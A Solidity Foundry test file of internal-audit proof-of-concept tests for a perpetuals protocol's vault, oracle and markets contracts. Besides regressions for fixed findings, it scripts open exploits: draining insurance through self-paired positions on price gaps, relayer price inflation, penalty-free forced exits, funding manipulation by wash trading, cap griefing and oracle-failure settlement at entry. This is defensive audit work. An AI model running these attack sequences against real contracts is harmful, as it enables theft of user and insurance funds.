// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.28;

import {Test} from "forge-std/Test.sol";
import {VelumBase} from "../Base.t.sol";
import {VelumVault} from "../../src/VelumVault.sol";
import {OracleAdapter} from "../../src/OracleAdapter.sol";
import {MakerBook} from "../../src/MakerBook.sol";
import {PerpsMarkets} from "../../src/PerpsMarkets.sol";
import {PerpsBase} from "../../src/perps/PerpsBase.sol";
import {IVelumVault} from "../../src/interfaces/IVelumVault.sol";
import {IOracleAdapter} from "../../src/interfaces/IOracleAdapter.sol";
import {IMakerBook} from "../../src/interfaces/IMakerBook.sol";
import {MockERC20} from "../mocks/MockERC20.sol";
import {MockAggregator} from "../mocks/MockAggregator.sol";
import {BombAccount} from "./AuditHelpers.sol";

/// @notice Internal audit (2026-11) proof-of-concept tests, named after the finding they prove.
///         Tests named test_Fxx_fixed_* are regressions for fixed findings. The others still
///         demonstrate OPEN findings (see docs/audit/2026-11-internal.md) and must be inverted
///         into regressions when each one is fixed.
contract AuditPoC is VelumBase {
    address internal mallory = makeAddr("mallory"); // attacker, maker address
    address internal mallory2 = makeAddr("mallory2"); // attacker, second (taker) address

    // ------------------------------------------------------------ helpers

    function _pos(uint256 id) internal view returns (PerpsBase.Position memory) {
        return perps.getPosition(id);
    }

    function _fundingIndex() internal view returns (int256 idx) {
        (,,,, idx,,) = perps.markets(address(tsla));
    }

    function _fundingRate() internal view returns (int256 rate) {
        (,,,,, rate,) = perps.markets(address(tsla));
    }

    function _offerAs(address maker, uint256 backing, uint16 openBps, uint16 closeBps) internal returns (uint256 id) {
        _fund(maker, usdg, backing);
        vm.prank(maker);
        id = book.postOffer(address(tsla), backing, backing, openBps, closeBps, uint64(block.timestamp + 365 days));
    }

    function _try(address caller, uint256 gasLimit, bytes memory data) internal returns (bool ok) {
        vm.prank(caller);
        (ok,) = address(perps).call{gas: gasLimit}(data);
    }

    function _seedInsurance(uint256 amount) internal {
        _fund(carol, usdg, amount);
        vm.prank(carol);
        perps.fundInsurance(amount);
    }

    // ------------------------------------------------------------ F-01: return-bomb bond refund

    /// @notice F-01 regression (fixed): bond refunds are pull-only, so a requester contract that
    ///         answers ETH with a huge revert payload can no longer block close, liquidation or
    ///         forced-exit settlement. The refund is recorded and claimable instead.
    function test_F01_fixed_takerBombCannotBlockLiquidation() public {
        uint256 offer = _offerAs(bob, 10_000 * USD, 5, 5);
        BombAccount evil = new BombAccount();
        _fund(address(evil), usdg, 1000 * USD);
        vm.deal(address(evil), 1 ether);
        vm.prank(address(evil));
        uint256 id = perps.open(offer, address(tsla), true, 1000 * USD, 10, 0);
        vm.prank(address(evil));
        perps.requestForcedExit{value: 0.001 ether}(id);
        evil.setArmed(true);

        _movePriceTo(address(tsla), 333e18);
        assertTrue(perps.isLiquidatable(id));
        assertTrue(_try(liquidator, 30_000_000, abi.encodeCall(perps.liquidate, (id))), "liquidation goes through");
        assertFalse(_pos(id).open);
        assertEq(perps.bondRefunds(address(evil)), 0.001 ether, "bond recorded for claiming");
    }

    function test_F01_fixed_makerBombCannotBlockTakerClose() public {
        BombAccount evilMaker = new BombAccount();
        _fund(address(evilMaker), usdg, 10_000 * USD);
        vm.deal(address(evilMaker), 1 ether);
        vm.prank(address(evilMaker));
        uint256 offer =
            book.postOffer(address(tsla), 10_000 * USD, 10_000 * USD, 5, 5, uint64(block.timestamp + 365 days));
        _fund(alice, usdg, 1001 * USD);
        uint256 id = _open(alice, offer, true, 1000 * USD, 2);
        _movePriceTo(address(tsla), 420e18);
        vm.prank(address(evilMaker));
        perps.requestForcedExit{value: 0.001 ether}(id);
        evilMaker.setArmed(true);

        assertTrue(_try(alice, 30_000_000, abi.encodeCall(perps.close, (id, 0))), "taker closes");
        assertFalse(_pos(id).open);
    }

    // ------------------------------------------------------------ F-02: self-paired gap straddle

    /// @dev Attacker opens a 5x long from mallory2 against mallory's own offer (SelfTrade only compares
    ///      one address). The relay accepts any jump after an hour without updates (e.g. overnight).
    function _gapStraddle(bool down) internal returns (uint256 profit, uint256 drained) {
        _seedInsurance(20_000 * USD);
        uint256 offer = _offerAs(mallory, 20_000 * USD, 0, 0);
        _fund(mallory2, usdg, 5000 * USD);
        uint256 start = 25_000 * USD;
        vm.prank(mallory2);
        uint256 id = perps.open(offer, address(tsla), true, 20_000 * USD, 10, 0);

        vm.warp(block.timestamp + 16 hours); // market closed overnight, relay silent
        _pushPrice(address(tsla), down ? (TSLA_PRICE * 70) / 100 : (TSLA_PRICE * 130) / 100); // 30% gap
        uint256 insBefore = perps.insurance();
        vm.prank(mallory2);
        perps.liquidate(id);
        vm.prank(mallory);
        book.withdrawOffer(offer);
        profit = _bal(mallory, usdg) + _bal(mallory2, usdg) - start;
        drained = insBefore - perps.insurance();
    }

    function test_F02_selfPairedGapDown_drainsInsurance() public {
        (uint256 profit, uint256 drained) = _gapStraddle(true);
        emit log_named_decimal_uint("attacker profit, -30% gap", profit, 6);
        assertGt(profit, 1900 * USD);
        assertGt(drained, 1900 * USD);
    }

    function test_F02_selfPairedGapUp_drainsInsurance() public {
        (uint256 profit, uint256 drained) = _gapStraddle(false);
        emit log_named_decimal_uint("attacker profit, +30% gap", profit, 6);
        assertGt(profit, 1900 * USD);
        assertGt(drained, 1900 * USD);
    }

    // ------------------------------------------------------------ F-04: relayer power

    /// @notice The "10% per update" relay limit is per second: the relayer key doubles a price in 8 s
    ///         and an accomplice taker takes the maker's whole margin (plus insurance) by liquidation.
    function test_F04_relayerDoublesPriceInEightSeconds() public {
        _seedInsurance(1000 * USD);
        uint256 offer = _offerAs(bob, 10_000 * USD, 5, 5);
        _fund(mallory2, usdg, 1000 * USD);
        vm.prank(mallory2);
        uint256 id = perps.open(offer, address(tsla), true, 1000 * USD, 10, 0);
        uint256 t0 = block.timestamp;
        uint256 p = TSLA_PRICE;
        for (uint256 i; i < 8; ++i) {
            p = (p * 110) / 100;
            _pushPrice(address(tsla), p);
        }
        assertEq(block.timestamp - t0, 8);
        assertGt(p, 2 * TSLA_PRICE);
        uint256 before = _bal(mallory2, usdg);
        vm.prank(mallory2);
        perps.liquidate(id);
        uint256 got = _bal(mallory2, usdg) - before;
        emit log_named_decimal_uint("accomplice payout on 200 margin", got, 6);
        assertGt(got, 400 * USD); // whole 400 pool + insurance cover
    }

    // ------------------------------------------------------------ F-06: forced exit vs penalty / spread

    /// @notice A loser below maintenance with a matured forced-exit request settles it itself, paying no
    ///         liquidation penalty, no close spread (5% here) and no fee.
    function test_F06_forcedExitAvoidsPenaltySpreadAndFee() public {
        uint256 offer = _offerAs(bob, 10_000 * USD, 0, 500); // 5% binding close spread
        _fund(alice, usdg, 1000 * USD);
        vm.deal(alice, 1 ether);
        uint256 id = _open(alice, offer, true, 1000 * USD, 10);
        vm.prank(alice);
        perps.requestForcedExit{value: 0.001 ether}(id);
        vm.warp(block.timestamp + 7 days);
        _pushPrice(address(tsla), 352e18);
        perps.advanceFunding(address(tsla));
        assertTrue(perps.isLiquidatable(id));
        int256 claim = perps.takerClaimAt(id, 352e18);
        assertGt(claim, 0);
        uint256 insBefore = perps.insurance();
        uint256 before = _bal(alice, usdg);
        vm.prank(alice);
        perps.settleForcedExit(id); // front-runs any liquidator
        assertEq(_bal(alice, usdg) - before, uint256(claim), "full claim: no penalty, spread or fee");
        assertEq(perps.insurance(), insBefore);
    }

    // ------------------------------------------------------------ F-07: wash trading moves funding

    /// @notice Funding is set by global taker skew. A wash position (attacker as both maker and taker,
    ///         second address bypasses SelfTrade) flips the sign so honest longs pay instead of receive.
    function test_F07_washTradeFlipsFundingSign() public {
        uint256 offer = _offerAs(bob, 50_000 * USD, 5, 5);
        _fund(alice, usdg, 10_000 * USD);
        _fund(carol, usdg, 10_000 * USD);
        _open(alice, offer, true, 1000 * USD, 4); // honest long
        _open(carol, offer, false, 3000 * USD, 4); // honest short: shorts dominate
        assertLt(_fundingRate(), 0, "longs receive before the wash");

        uint256 m = _offerAs(mallory, 30_000 * USD, 0, 0);
        _fund(mallory2, usdg, 10_000 * USD);
        vm.prank(mallory2);
        perps.open(m, address(tsla), true, 30_000 * USD, 10, 0); // self-paired, funding nets to zero for it
        assertGt(_fundingRate(), 0, "longs pay after the wash");
        int256 idx0 = _fundingIndex();
        vm.warp(block.timestamp + 1 hours);
        _pushPrice(address(tsla), TSLA_PRICE);
        perps.advanceFunding(address(tsla));
        assertGt(_fundingIndex() - idx0, 0, "honest long now pays funding");
    }

    // ------------------------------------------------------------ Info: donations to modules are stuck

    function test_I_depositToModuleAccountIsStuck() public {
        usdg.mint(carol, 100 * USD);
        vm.startPrank(carol);
        usdg.approve(address(vault), 100 * USD);
        vault.deposit(address(usdg), 100 * USD, address(perps));
        vm.stopPrank();
        // perps has no way to account for or release it
        assertEq(_bal(address(perps), usdg), perps.totalMargin() + perps.insurance() + 100 * USD);
    }
}

/// @notice F-08: self-paired positions fill a side's open-interest cap and lock honest takers out.
contract AuditOiCapPoC is VelumBase {
    function _oiCap() internal pure override returns (uint256) {
        return 150e18;
    }

    function test_F08_selfPairedOiCapGriefing() public {
        address m1 = makeAddr("m1");
        address m2 = makeAddr("m2");
        _fund(m1, usdg, 60_000 * USD);
        vm.prank(m1);
        uint256 offer =
            book.postOffer(address(tsla), 60_000 * USD, 60_000 * USD, 0, 0, uint64(block.timestamp + 1 days));
        _fund(m2, usdg, 20_000 * USD);
        vm.startPrank(m2);
        perps.open(offer, address(tsla), true, 39_000 * USD, 10, 0); // ~99.6 TSLA
        perps.open(offer, address(tsla), true, 19_500 * USD, 10, 0); // ~49.8 TSLA
        vm.stopPrank();

        _fund(alice, usdg, 1000 * USD);
        uint256 honest = _postOffer(10_000 * USD, 10_000 * USD, 5, 5);
        vm.prank(alice);
        vm.expectRevert(abi.encodeWithSelector(PerpsBase.OpenInterestCap.selector, address(tsla)));
        perps.open(honest, address(tsla), true, 500 * USD, 4, 0);
    }
}

/// @notice F-03: with a Chainlink source, `isDead` is true the moment one read fails or one answer is
///         out of bounds, so a matured forced exit settles at the entry price instead of after 14 days.
contract AuditChainlinkPoC is Test {
    uint256 internal constant USD = 1e6;
    MockERC20 internal usdg;
    MockERC20 internal tsla;
    VelumVault internal vault;
    OracleAdapter internal oracle;
    MakerBook internal book;
    PerpsMarkets internal perps;
    MockAggregator internal feed;
    address internal alice = makeAddr("alice");
    address internal bob = makeAddr("bob");

    function setUp() public {
        vm.warp(1_800_000_000);
        usdg = new MockERC20("Global Dollar", "USDG", 6);
        tsla = new MockERC20("Tesla", "TSLA", 18);
        vault = new VelumVault();
        oracle = new OracleAdapter();
        book = new MakerBook(IVelumVault(address(vault)), address(usdg));
        perps = new PerpsMarkets(
            IVelumVault(address(vault)), IOracleAdapter(address(oracle)), IMakerBook(address(book)), address(usdg), 6
        );
        feed = new MockAggregator(8);
        feed.set(391.65e8, block.timestamp);

        address[] memory tokens = new address[](2);
        tokens[0] = address(usdg);
        tokens[1] = address(tsla);
        address[] memory modules = new address[](2);
        modules[0] = address(book);
        modules[1] = address(perps);
        vault.setup(tokens, modules);

        address[] memory stocks = new address[](1);
        stocks[0] = address(tsla);
        address[] memory feeds = new address[](1);
        feeds[0] = address(feed);
        uint128[] memory mins = new uint128[](1);
        uint128[] memory maxs = new uint128[](1);
        mins[0] = 1e18;
        maxs[0] = 100_000e18;
        oracle.setup(stocks, feeds, mins, maxs, address(0));
        book.setup(address(perps), stocks);
        uint256[] memory caps = new uint256[](1);
        caps[0] = 10_000e18;
        perps.setup(stocks, caps);
    }

    function _fund(address who, uint256 amount) internal {
        usdg.mint(who, amount);
        vm.startPrank(who);
        usdg.approve(address(vault), amount);
        vault.deposit(address(usdg), amount, who);
        vault.setApproval(address(book), true);
        vault.setApproval(address(perps), true);
        vm.stopPrank();
    }

    function test_F03_transientFeedFailureSettlesForcedExitAtEntry() public {
        _fund(bob, 10_000 * USD);
        vm.prank(bob);
        uint256 offer =
            book.postOffer(address(tsla), 10_000 * USD, 10_000 * USD, 5, 5, uint64(block.timestamp + 30 days));
        _fund(alice, 1000 * USD);
        vm.deal(alice, 1 ether);
        vm.prank(alice);
        uint256 id = perps.open(offer, address(tsla), true, 1000 * USD, 10, 0);
        vm.prank(alice);
        perps.requestForcedExit{value: 0.001 ether}(id);

        vm.warp(block.timestamp + 7 days);
        feed.set(360.3e8, block.timestamp); // -8%: alice is losing ~80 USDG
        perps.advanceFunding(address(tsla));
        int256 claimAtOracle = perps.takerClaimAt(id, 360.3e18);

        // One second later the feed read reverts once (e.g. proxy/aggregator change).
        vm.warp(block.timestamp + 1);
        feed.setBroken(true);
        assertTrue(oracle.isDead(address(tsla)), "dead immediately, not after 14 days");

        uint256 before = vault.balanceOf(alice, address(usdg));
        vm.prank(alice);
        perps.settleForcedExit(id); // settles at the entry price: pnl = 0
        uint256 got = vault.balanceOf(alice, address(usdg)) - before;
        emit log_named_decimal_int("claim at oracle price", claimAtOracle, 6);
        emit log_named_decimal_uint("paid at entry price", got, 6);
        assertGt(got, uint256(claimAtOracle) + 75 * USD);
    }

    function test_F03_outOfBoundsAnswerIsDead() public {
        assertFalse(oracle.isDead(address(tsla)));
        feed.set(0.5e8, block.timestamp); // below the 1 USDG bound (e.g. after a split or a bad round)
        assertTrue(oracle.isDead(address(tsla)));
        feed.set(0, block.timestamp);
        assertTrue(oracle.isDead(address(tsla)));
    }
}
